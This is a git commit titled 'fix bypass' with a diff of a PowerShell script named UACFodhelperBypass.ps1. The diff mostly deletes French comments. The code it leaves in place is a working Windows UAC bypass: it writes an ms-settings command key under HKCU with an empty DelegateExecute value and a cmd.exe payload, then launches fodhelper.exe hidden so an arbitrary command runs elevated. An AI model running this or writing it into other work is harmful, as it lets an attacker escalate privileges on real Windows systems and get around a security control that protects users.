a4fb603cf856991a96b00b8c5cb5b72a210ac06e
k-lfa <37381068+k-lfa@users.noreply.github.com>
2025-03-21 17:31:39 +0100

    fix bypass

--- Custom/UACFodhelperBypass.ps1
+++ Custom/UACFodhelperBypass.ps1
@@ -5,15 +5,13 @@ function FodhelperBypass {
         [string]$Command
     )
 
-    # Construit la commande à exécuter via cmd.exe /c start "" ...
     $payload = 'cmd.exe /c start "" ' + $Command
 
-    # Crée la clé de registre pour le bypass
+
     New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
     New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
     Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $payload -Force
 
-    # Lance le bypass via fodhelper
     Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
     # Petite pause pour laisser le temps au process élevé de démarrer
